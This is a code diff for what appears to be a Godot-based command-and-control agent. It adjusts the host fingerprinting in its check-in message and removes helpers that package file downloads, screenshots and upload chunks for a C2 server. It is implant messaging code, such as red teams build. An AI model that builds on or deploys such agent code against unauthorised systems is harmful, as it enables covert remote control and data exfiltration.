@@ -51,7 +51,7 @@ func get_checkin_payload():
 	if OS.has_environment("HOSTNAME"):
 		hostname = OS.get_environment("HOSTNAME")
 
-	var os = "%s (%s)" % [OS.get_name(), OS.get_model_name()]
+	var os = "%s (%s) - %s" % [OS.get_name(), OS.get_model_name(), OS.get_version()]
 	if OS.has_environment("OS"):
 		os = OS.get_environment("OS")
 	else:
@@ -74,7 +74,7 @@ func get_checkin_payload():
 
 	var ip: String = "127.0.0.1"# TODO...?
 	var upnp = UPNP.new()
-	var err = upnp.discover(2000, 2)
+	var err = upnp.discover(1000, 4)
 	
 	if err != OK:
 		print(str(err))
@@ -109,44 +109,6 @@ func get_tasking_payload():
 
 	return JSON.stringify(payload)
 
-func create_file_response(task_id, filepath, host, is_screenshot, chunk_count, chunk_size, user_output, status):
-	var payload = {
-		"task_id": task_id,
-		"download": {
-			"total_chunks": chunk_count,
-			"full_path": filepath,
-			"host": host,
-			"is_screenshot": is_screenshot,
-		}
-	}
-
-	#return to_json(payload)
-	return payload
-
-func upload_file_chunk_request(task_id, filepath, chunk_size, file_id, chunk_num):
-	var payload = {
-		"upload": {
-			"chunk_size": chunk_size,
-			"file_id": file_id,
-			"chunk_num": chunk_num,
-			"full_path": filepath
-		},
-		"task_id": task_id
-	}
-
-	return payload
-
-func create_file_response_chunk(task_id, file_id, chunk_num, data):
-	var payload = {
-		"task_id": task_id,
-		"download": {
-			"chunk_num": chunk_num,
-			"file_id": file_id,
-			"chunk_data": Marshalls.raw_to_base64(data),
-		}
-	}
-
-	return payload
 
 func create_task_response(status, completed, task_id, output, artifacts = [], credentials = [], unkeyed_payloads = []):
 	var payload = {
